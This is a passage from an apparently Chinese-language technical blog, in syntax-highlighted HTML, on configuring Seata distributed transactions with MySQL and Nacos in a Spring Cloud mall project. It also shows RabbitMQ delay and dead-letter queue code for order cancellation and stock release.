class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">KEY</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>idx_xid<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">ENGINE</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">InnoDB</span>\n  <span class=\"token keyword\">DEFAULT</span> <span class=\"token keyword\">CHARSET</span> <span class=\"token operator\">=</span> utf8<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<blockquote>\n<ul>\n<li>创建lock_table 建表脚本在源码中的script目录去找</li>\n</ul>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">IF</span> <span class=\"token operator\">NOT</span> <span class=\"token keyword\">EXISTS</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>lock_table<span class=\"token punctuation\">`</span></span>\n<span class=\"token punctuation\">(</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>row_key<span class=\"token punctuation\">`</span></span>        <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span>            <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>transaction_id<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">BIGINT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_id<span class=\"token punctuation\">`</span></span>      <span class=\"token keyword\">BIGINT</span>       <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>resource_id<span class=\"token punctuation\">`</span></span>    <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>table_name<span class=\"token punctuation\">`</span></span>     <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pk<span class=\"token punctuation\">`</span></span>             <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_create<span class=\"token punctuation\">`</span></span>     <span class=\"token keyword\">DATETIME</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_modified<span class=\"token punctuation\">`</span></span>   <span class=\"token keyword\">DATETIME</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>row_key<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">KEY</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>idx_branch_id<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_id<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">ENGINE</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">InnoDB</span>\n  <span class=\"token keyword\">DEFAULT</span> <span class=\"token keyword\">CHARSET</span> <span class=\"token operator\">=</span> utf8<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>配置上线注册到nacos得配置 在源码中的script目录去找到 config-center下得config.txt修改如下配置</p>\n</blockquote>\n<pre class=\"line-numbers language-txt\" data-language=\"txt\"><code class=\"language-txt\">store.mode=db\nstore.db.url=jdbc:mysql://127.0.0.1:3306/seata_server?useUnicode=true&amp;rewriteBatchedStatements=true\nstore.db.user=root\nstore.db.password=lqs\n\nservice.vgroupMapping.chengdu=default # vgroupMappin后面得可以随便写但是要记住这个很重要,配置客户端得时候会用到,这个default可以修改但是必须和注册中心集群名字一样 这个配置也就是集群得时候用得<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<blockquote>\n<p>nacos得到源码中的script目录中config-center下得config.txt中的配置</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 可以根据自己得需要修改这个文件</span>\n<span class=\"token function\">bash</span> config-center/nacos/nacos-config.sh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>以上成功之后 启动seata</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">bash</span> bin/seata-server.sh <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-n</span> 节点数量<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"整合seata\"><a href=\"#整合seata\" class=\"headerlink\" title=\"整合seata\"></a>整合seata</h3><blockquote>\n<p>导入Seata依赖 spring-cloud-starter-alibaba-seata 默认还对导入seata-all seata-all得版本必须和下载得seata-server版本一样</p>\n</blockquote>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token comment\">&lt;!--        seata事务协调器--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>com.alibaba.cloud<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>spring-cloud-starter-alibaba-seata<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>配置application.properties</p>\n</blockquote>\n<pre class=\"line-numbers language-properties\" data-language=\"properties\"><code class=\"language-properties\">\n<span class=\"token key attr-name\">seata.tx-service-group</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">chengdu</span>\n<span class=\"token key attr-name\">seata.enabled</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">true</span>\n<span class=\"token key attr-name\">seata.application-id</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">$&#123;spring.application.name&#125;</span>\n<span class=\"token key attr-name\">seata.enable-auto-data-source-proxy</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">true</span>\n\n<span class=\"token key attr-name\">seata.config.type</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">nacos</span>\n<span class=\"token key attr-name\">seata.config.nacos.group</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">SEATA_GROUP</span>\n<span class=\"token key attr-name\">seata.config.nacos.server-addr</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">localhost</span>\n<span class=\"token key attr-name\">seata.config.nacos.namespace</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">mall-dev</span>\n<span class=\"token key attr-name\">seata.config.nacos.password</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">nacos</span>\n<span class=\"token key attr-name\">seata.config.nacos.username</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">nacos</span>\n\n\n<span class=\"token key attr-name\">seata.registry.type</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">nacos</span>\n<span class=\"token key attr-name\">seata.registry.nacos.group</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">SEATA_GROUP</span>\n<span class=\"token key attr-name\">seata.registry.nacos.application</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">seata-server</span>\n<span class=\"token key attr-name\">seata.registry.nacos.server-addr</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">localhost</span>\n<span class=\"token key attr-name\">seata.registry.nacos.namespace</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">mall-dev</span>\n<span class=\"token key attr-name\">seata.registry.nacos.password</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">nacos</span>\n<span class=\"token key attr-name\">seata.registry.nacos.username</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">nacos</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>使用分布式事务 将@GlobalTransactional注解放在TM上</p>\n</blockquote>\n<blockquote>\n<p>如果TM出现异常,那么RM和TM都回滚,如果RM出现异常并且被处理(如try…catch),那么TC就感知不到,在TM中根据状态码来手动抛出异常回滚所有事务 或者GlobalTransactionContext.reload(RootContext.getXID()).rollback();手动回滚</p>\n</blockquote>\n<blockquote>\n<p>如果TM出现异常,那么RM和TM都回滚,如果RM中出现异常没有被处理,那么TC就可以感知到,并且直接回滚所有事务</p>\n</blockquote>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@GlobalTransactional</span>\n<span class=\"token annotation punctuation\">@Transactional</span><span class=\"token punctuation\">(</span>readOnly <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span>\n<span class=\"token annotation punctuation\">@Override</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name\">SubmitOrderResponseVo</span> <span class=\"token function\">submitOrder</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">OrderSubmitVo</span> orderSubmitVo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token class-name\">SubmitOrderResponseVo</span> submitOrderResponse<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SubmitOrderResponseVo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    orderSubmitVoThreadLocal<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>orderSubmitVo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token class-name\">AccountRespTo</span> account<span class=\"token operator\">=</span><span class=\"token class-name\">UserLoginInterceptor</span><span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 验证令牌</span>\n    <span class=\"token class-name\">String</span> orderToken<span class=\"token operator\">=</span>orderSubmitVo<span class=\"token punctuation\">.</span><span class=\"token function\">getOrderToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"柔性事务-可靠消息-最终一致性方案-RabbitMQ\"><a href=\"#柔性事务-可靠消息-最终一致性方案-RabbitMQ\" class=\"headerlink\" title=\"柔性事务-可靠消息+最终一致性方案(RabbitMQ)\"></a>柔性事务-可靠消息+最终一致性方案(RabbitMQ)</h3><blockquote>\n<p>我们使用这个方式来处理保存订单和锁定库存得分布式事务业务,使用延时队列来做,无论是下单失败还是锁定库存失败,通过延时队列,最终都会以补偿得方式回滚,交换机最好用Topic模式<br>,如果要使用这个模式,最好还是数据表不要太单一,比如我们系统里有库存表,库存工作单表,库存工作单详情表,订单表这些表具有明确得指向性,比如,我们知道库存表一张表,如果锁定了库存,<br>我们并不知道究竟是哪个用户锁定了库存,如果有工作单和详情单,我们就可以知道谁锁定了库存锁定了多少,再配合mq得消息,就可以准确得解锁.当然也可以不建立这些表,通过发送得mq信息来解锁.</p>\n</blockquote>\n<blockquote>\n<p>延时队列</p>\n</blockquote>\n<blockquote>\n<blockquote>\n<p>延时队列:给队列设置一个ttl,到了指定得ttl里面得消息就会变成死信,这个被设置了ttl得就是延时队列,不能被消费者监听</p>\n</blockquote>\n</blockquote>\n<blockquote>\n<blockquote>\n<p>死信:就是延时队列中过期得信息,死信在通过交换机发送给另外一个队列,只要有消费者来监听这个队列就可以获取这个死信来执行对应得业务</p>\n</blockquote>\n</blockquote>\n<blockquote>\n<p>我们系统得<code>保存订单和锁定库存得分布式事务业务</code><br><img src=\"https://pub-pce.oss-cn-chengdu.aliyuncs.com/somgWebImageSingleGenerate/2023-01-26/ae981d0870da45cb8d2269487437db23.png\"><br><img src=\"https://pub-pce.oss-cn-chengdu.aliyuncs.com/somgWebImageSingleGenerate/2023-01-26/920150f3ec1046cd93ee69c17d3908e6.png\"></p>\n</blockquote>\n<blockquote>\n<p>延时队列示例</p>\n</blockquote>\n<blockquote>\n<blockquote>\n<p>配置文件</p>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-properties\" data-language=\"properties\"><code class=\"language-properties\"><span class=\"token comment\"># 开启发送端确认，消息抵达交换机的确认，属于生产者确认</span>\n<span class=\"token key attr-name\">spring.rabbitmq.publisher-confirm-type</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">simple</span>\n<span class=\"token comment\"># 开启发送端消息抵达队列的确认，属于生产者确认</span>\n<span class=\"token key attr-name\">spring.rabbitmq.publisher-returns</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">true</span>\n<span class=\"token comment\"># 只要抵达队列，以异步发送优先回调,属于生产者配置</span>\n<span class=\"token key attr-name\">spring.rabbitmq.template.mandatory</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">true</span>\n\n<span class=\"token comment\"># 设置消费端手动签收</span>\n<span class=\"token key attr-name\">spring.rabbitmq.listener.direct.acknowledge-mode</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">manual</span>\n<span class=\"token comment\"># 设置消费端手动签收</span>\n<span class=\"token key attr-name\">spring.rabbitmq.listener.simple.acknowledge-mode</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">manual</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<blockquote>\n<p>代码</p>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Configuration</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">OrderAutoCancelPublisher</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">></span></span> <span class=\"token punctuation\">&#123;</span>\n\n\n    <span class=\"token annotation punctuation\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">RabbitTemplate</span> rabbitClient<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">sendOrderCancelTimeDelayMessage</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token comment\">/**\n         * 发消息的时候写好发给哪个交换机，发给哪个route-key，要发送的消息就行了\n         */</span>\n        rabbitClient<span class=\"token punctuation\">.</span><span class=\"token function\">convertAndSend</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_TIME_DELAY_QUEUE_ROUTE_KEY</span><span class=\"token punctuation\">,</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">sendOrderCancelEdTimeDelayMessage</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token comment\">/**\n         * 发消息的时候写好发给哪个交换机，发给哪个route-key，要发送的消息就行了\n         */</span>\n        rabbitClient<span class=\"token punctuation\">.</span><span class=\"token function\">convertAndSend</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_ED_RELEASE_WARE_STOCK_ROUTE_KEY</span><span class=\"token punctuation\">,</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 创建队列和交换机以及绑定关系</span>\n\n    <span class=\"token comment\">/**\n     * 创建交换机,这个交换机上面绑定一个延时队列和一个普通队列\n     * 这个交换机用于绑定订单得延时队列和订单得死信队列   死信(延时队列过期得信息)\n     * @return\n     */</span>\n    <span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Exchange</span> <span class=\"token function\">orderCancelExchange</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TopicExchange</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * 创建库存得延时队列,配置项:\n     *  这个队列和上面得交换机链接,只要订单保存成功就发送消息到这个队列\n     *  延时到期绑定哪一个交换机\n     *  延时到期绑定哪一个routeKey\n     *  延时时间 毫秒\n     *\n     * @return\n     */</span>\n    <span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Queue</span> <span class=\"token function\">orderCancelTimeDelayQueue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> args <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        args<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x-dead-letter-exchange\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        args<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x-dead-letter-routing-key\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_INVOKE_QUEUE_ROUTE_KEY</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        args<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x-message-ttl\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_TIME_DELAY_QUEUE_TTL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Queue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_TIME_DELAY_QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * 创建普通队列,用于接收延时队列过期得消息, 接收死信,可以被监听到 然后做逻辑处理\n     * @return\n     */</span>\n    <span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Queue</span> <span class=\"token function\">orderCancelInvokeQueue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Queue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_INVOKE_QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * 创建绑定关系:延时队列和交换机得关联 绑定交换机和延时队列\n     * @return\n     */</span>\n    <span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Binding</span> <span class=\"token function\">orderCancelDelayQueueBinding</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Binding</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_TIME_DELAY_QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Binding<span class=\"token punctuation\">.</span>DestinationType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_TIME_DELAY_QUEUE_ROUTE_KEY</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * 创建绑定关系:普通队列和交换机得关联 绑定交换机和死信队列\n     * @return\n     */</span>\n    <span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Binding</span> <span class=\"token function\">orderCancelInvokeQueueBinding</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Binding</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_INVOKE_QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Binding<span class=\"token punctuation\">.</span>DestinationType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_INVOKE_QUEUE_ROUTE_KEY</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * 创建绑定关系:普通队列和交换机得关联 绑定ware库存得死信队列,不用等待,直接可以被ware监听到\n     * @return\n     */</span>\n    <span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Binding</span> <span class=\"token function\">orderCancelEdQueueBinding</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Binding</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">WARE_STOCK_RELEASE_QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Binding<span class=\"token punctuation\">.</span>DestinationType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_ED_RELEASE_WARE_STOCK_ROUTE_KEY</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n\n    <span class=\"token comment\">/**\n     * 定制RabbitTemplate,将确认回调设置进去\n     */</span>\n    <span class=\"token annotation punctuation\">@PostConstruct</span> <span class=\"token comment\">// MyRabbitConfig创建完成以后，执行这个方法</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">initRabbitTemplate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n        rabbitClient<span class=\"token punctuation\">.</span><span class=\"token function\">setConfirmCallback</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">RabbitTemplate<span class=\"token punctuation\">.</span>ConfirmCallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token comment\">/**\n             * 消息抵达exchange执行这个回调\n             * @param correlationData 回调的相关数据 当前消息的唯一关联数据(这个消息的唯一id)\n             * @param ack 消息是否成功收到, 只要消息抵达了服务器就是true\n             * @param cause 失败的原因\n             */</span>\n            <span class=\"token annotation punctuation\">@Override</span>\n            <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CorrelationData</span> correlationData<span class=\"token punctuation\">,</span> <span class=\"token keyword\">boolean</span> ack<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> cause<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token comment\">// System.out.println(\"correlationData\" + correlationData);</span>\n                <span class=\"token comment\">// System.out.println(\"ack\" + ack);</span>\n                <span class=\"token comment\">// 